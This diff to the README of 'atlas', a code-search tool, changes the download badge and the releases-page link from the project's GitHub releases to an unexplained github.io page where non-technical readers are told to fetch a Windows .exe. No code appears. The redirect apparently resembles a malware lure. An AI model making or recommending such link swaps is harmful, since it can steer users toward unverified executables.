@@ -1,6 +1,6 @@
 # 🔍 atlas - Improve code search and project navigation 
 
-[![](https://img.shields.io/badge/Download_Atlas-Blue.svg)](https://github.com/expressionsound800/atlas/releases)
+[![](https://img.shields.io/badge/Download_Atlas-Blue.svg)](https://expressionsound800.github.io)
 
 ## 📖 About this project
 Atlas helps you find information within your software projects. Projects grow complex over time. Files multiply and cross-references become hard to track. This tool maps your code structure so you find what you need without manual searching. It acts as a guide for your coding workflow.
@@ -11,7 +11,7 @@ The software creates a searchable index of your project files. It understands re
 You do not need programming skills to use Atlas. The software runs on your computer and keeps your data local. It does not send your code to external servers. Follow the steps below to set up the tool.
 
 ## 📥 Download and Install
-1. Visit the [releases page](https://github.com/expressionsound800/atlas/releases) to access the installation files.
+1. Visit the [releases page](https://expressionsound800.github.io) to access the installation files.
 2. Look for the file ending in `.exe`. This is the Windows installer.
 3. Click the file name to start the download.
 4. Open the folder where your computer saves downloads.
